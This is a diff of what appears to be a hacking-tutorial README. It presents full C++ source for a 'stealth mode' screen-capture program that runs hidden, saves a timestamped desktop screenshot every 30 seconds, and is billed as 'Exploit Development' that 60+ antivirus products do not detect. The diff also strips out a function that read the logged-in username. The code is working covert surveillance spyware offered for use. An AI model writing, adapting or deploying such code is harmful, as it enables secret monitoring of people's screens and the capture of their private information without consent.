@@ -1,5 +1,6 @@
-### Hidden Screen Catpure C++ (Stealth Mode)
-Take a screenshot of desktop in hidden mode using Visual C++ and save automatically to 'jpeg' file in every 30 second. 60+ Most Popular antivirus not detect this application while it is running on background.
+### Exploit Development : Hidden Screen Catpure C++ (Stealth Mode)
+
+It is primary designed to be hidden and monitoring the computer activity. Take a screenshot of desktop in hidden mode using Visual C++ and save automatically to 'jpeg' file in every 30 second. 60+ Most Popular antivirus not detect this application while it is running on background.
 
 ### Why Programming Is Important for Hackers to Know.
 
@@ -38,7 +39,7 @@ i choose to make a series about C/C++ because C++ is a powerful language and is 
 #include <GdiPlus.h>
 #include <lmcons.h>
 
-char acUserName[100];
+//char acUserName[100];
 
 using namespace Gdiplus;
 using namespace std;
@@ -49,15 +50,6 @@ fstream log_error_file("log_error.txt",ios::app);
 #pragma comment(lib, "user32.lib") 
 #pragma comment(lib,"Wininet.lib")
 #pragma comment (lib,"gdiplus.lib")
-
-void getusername(){
-	
-	DWORD nUserName = sizeof(acUserName);
-	GetUserName(acUserName, &nUserName);
-	err<<acUserName;
-	err.close();
-
-}
 
 void screenshot(string file){
 	ULONG_PTR gdiplustoken;
@@ -70,16 +62,16 @@ void screenshot(string file){
 	HDC dc=GetDC(GetDesktopWindow());//get desktop content
 	HDC dc2 = CreateCompatibleDC(dc);	 //copy context
 
-	RECT rc0kno;
+	RECT rc0kno;  // rectangle  Object
 
 	GetClientRect(GetDesktopWindow(),&rc0kno);// get desktop size;
 	int w = rc0kno.right-rc0kno.left;//width
 	int h = rc0kno.bottom-rc0kno.top;//height
 
-	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);//create bitmap
+	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);  //create bitmap
 	HBITMAP holdbitmap = (HBITMAP) SelectObject(dc2,hbitmap);
 
-	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);//copy pixel from pulpit to bitmap
+	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);  //copy pixel from pulpit to bitmap
 	Bitmap* bm= new Bitmap(hbitmap,NULL);
 
 	UINT num;
@@ -96,16 +88,16 @@ void screenshot(string file){
 	for(int i=0; i < num; i++)
 	{
 		if(wcscmp(imagecodecinfo[i].MimeType,L"image/jpeg")==0)
-			clsidEncoder = imagecodecinfo[i].Clsid;//get jpeg codec id
+			clsidEncoder = imagecodecinfo[i].Clsid;   //get jpeg codec id
 
 	}
 
 	free(imagecodecinfo);
 
 	wstring ws;
-	ws.assign(file.begin(),file.end());//sring to wstring
-	bm->Save(ws.c_str(),& clsidEncoder); //save in jpeg format
-	SelectObject(dc2,holdbitmap);//Release Objects
+	ws.assign(file.begin(),file.end());  //sring to wstring
+	bm->Save(ws.c_str(),& clsidEncoder);   //save in jpeg format
+	SelectObject(dc2,holdbitmap);  //Release Objects
 	DeleteObject(dc2);
 	DeleteObject(hbitmap);
 
@@ -117,13 +109,13 @@ void screenshot(string file){
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int CmdShow)
 {
 	while(true){
-	SYSTEMTIME st;
+	SYSTEMTIME st;  // create object of system time 
 	GetLocalTime(&st);
-	int year = st.wYear;
-	int month = st.wMonth;
-	int day = st.wDay;
-	int hour = st.wHour;
-	int mintue = st.wMinute;
+	int year = st.wYear;  // extract year from system time
+	int month = st.wMonth; // extract month from system time
+	int day = st.wDay; // extract year day system time
+	int hour = st.wHour; // extract year hours system time
+	int mintue = st.wMinute; // extract mintue from system time
 
 	string yearS =  to_string(year);
 	yearS += "_";
@@ -137,11 +129,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 	mintueS += "M.jpg";
 
 	string startDate;
-	startDate =dayS + monthS + yearS + hourS + mintueS;
+	startDate =dayS + monthS + yearS + hourS + mintueS;  // create complete string of date and time
 	
-	screenshot(startDate);
-	Sleep(500*30*1);
-//	getusername();
+	screenshot(startDate);   // send string to screenshot function
+	Sleep(500*30*1);  // delay execution of function 30 Seconds
 	}
 }
 
